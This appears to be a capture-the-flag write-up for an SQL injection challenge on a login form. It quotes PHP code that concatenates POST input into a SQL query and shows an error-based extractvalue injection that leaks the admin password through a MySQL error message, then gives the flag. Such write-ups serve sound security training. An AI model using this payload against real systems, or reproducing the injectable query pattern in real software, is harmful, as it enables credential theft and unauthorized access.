# [SQL Injection Level 4](http://s1063.vdi.mipt.ru:8000/challenges#SQL%20Injection%20Level%204)
### [Login form](http://chall1.ctf.pwne.xyz:5555/level4/)

# Solution
1. Analyze the code
```php
$query = "SELECT * FROM users WHERE username='{$_POST['username']}' AND password='{$_POST['password']}'";

if (!$result)
{
	die('MySQL query error: '. mysqli_error($conn));
}
```
2. If there is a syntax error in our injection, we get error message with some explanation.
3. For example, we can use `extractvalue` function.
login: `' and (select extractvalue(0,concat('$',(select password from users where username='admin'))));#`
Result: `MySQL query error: Unknown XPATH variable at: '$c6ef49ff6442e43cc883e25c440dfcb'`

**Answer**: `flag{c6ef49ff6442e43cc883e25c440dfcb}`